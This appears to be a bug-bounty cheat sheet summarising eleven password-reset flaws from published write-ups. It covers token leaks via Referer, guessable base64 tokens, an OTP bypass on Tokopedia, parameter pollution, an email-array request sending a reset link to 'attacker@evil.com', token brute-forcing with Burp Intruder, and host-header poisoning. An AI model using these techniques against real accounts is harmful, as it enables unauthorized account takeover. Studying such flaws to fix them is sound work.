# Password Reset Flaw 

---
<br> 
1 > Token Leak in referrer header 

Link :- https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

- Go to any website and click on password reset
-  Go to Link we received in our mail
-  you can go to the other website and capture req for that if it is vuln password reset link will be in referrer header 

---
  
<br> 
2 >  Password reset link 

 [  link ](https://medium.com/bugbountywriteup/bugbounty-how-i-was-able-to-compromise-any-user-account-via-reset-password-functionality-a11bb5f863b3)

1.   he clicked password reset and this is what he got 
      http://www._________.com/account/resetpassword? id=296417&token=dGVzdGFjY291bnQwOUBnbWFpbC5jb20=&vit=MjAxNi8xMC8yNQ==

2.    token is actually base64 encoding of our email of that account 
3.    vt is time stamp which is also base64 encoded
4.    http://www._________.com/account/resetpassword/?id=254346&token=dmFydW4wOTgxMUBnbWFpbC5jb20=&vit=MjAxNi8xMC8yNQ= 

5.    this is different user he found id for that user by brute forcing and this link worked for him 

----
<br>
3 > Password Reset without submitting OTP

Link : https://medium.com/@ironfisto/tokopedia-account-takeover-bug-worth-8-million-idr-5474cb5b5cc9

when user want to reset password he will recive link 
https://accounts.tokopedia.com/otp/c/page?otp_type=132& email=ezgcmmfgc%40champmails.com&ld=https://account s.tokopedia.com/resetpassword?e=ZXpnY21tZmdjQGNoYW1wbWFpbHMuY29t

main part is https://accounts.tokopedia.com/resetpassword?e=ZXpnY21tZmdjQGNoYW1wbWFpbHMuY29t

add “&otpcode=000000” at the end of password reset URL. and no otp required 

----
<br>

 4 > Password Reset flaw 

Link : https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

in this system have new password set after link clicking but in post we are sending the email too . you change email password reset done for that user too.

---
<br>
5 > Password Reset Link 

Link : 

lets suppose we have mail of ```johndoe@gmail.com ```
<br>

![this ](https://miro.medium.com/max/719/1*HJabwSnIwi3rWrAyZAbAdg.png)

Whenever you will request the reset link you will recieve token like this
<br>

![](https://miro.medium.com/max/1094/1*KvrYHQ_7-T2Lc0XVJLSfmg.png)  
<br>
</br>
we have mail timestamp and now we can bruteforce those two no and reset password for anyone.

----
6 > Passsword of victim to attacker 

The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address.

```
POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
```

----

7 > https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be

in post he used parameter pollution email=some&email=some1

---

8 >  Token Being [Predictable](https://medium.com/@fatnassifiras45/how-i-was-able-to-take-over-any-account-via-the-password-reset-functionality-ef1659f8b481)

In Password Reset token Some part was same for different request . 

He found shorter duration more predictable token willl be 

SO he did Payloads: My 2 accounts emails.
Threads: 20
URL-Encode: OFF 

Now, after configuring burp intruder I launched the attack and boom I got 2 tokens that differ only in the last character.


---

9> Passsword reset in [mail.ru](https://medium.com/kminthein/account-takeover-in-cups-mail-ru-bdab1483f92c)

https://cups.mail.ru/faq/restore-password/restore?step=1

After entering user email into password reset functionality, one time password reset code is sent to their email and it redirected to
https://cups.mail.ru/faq/restore-password/restore?step=3


User then put their one time password and if password is correct, it redirects to https://cups.mail.ru/faq/restore-password/restore?step=4.

Then he can reset their password and the requests contains
{“password”:”password”,”email”:”user@gmail.com”,”code”:”onetimepassword”} .

Due to lack of access control in their password reset functionality, I can reset every user’s password. I visit https://cups.mail.ru/faq/restore-password/restore?step=4 and then I changed original request which is {“password”:”password”,”email”:”user@gmail.com”,”code”:”onetimepassword”} to {“password”:”reset”, “email”: “victim@gmail.com”}

After removing code parameter and forward the requests and then it redirected to
https://cups.mail.ru/faq/restore-password/restore?step=5


-----

10 > https://medium.com/bugbountywriteup/fun-with-header-and-forget-password-with-a-twist-af095b426fb2

X-Forwarded-Host: localhost 

---

11 > Password reset poisoning with Referrer header

https://medium.com/bugbountywriteup/fun-with-header-and-forget-password-without-that-nasty-twist-cbf45e5cc8db

---

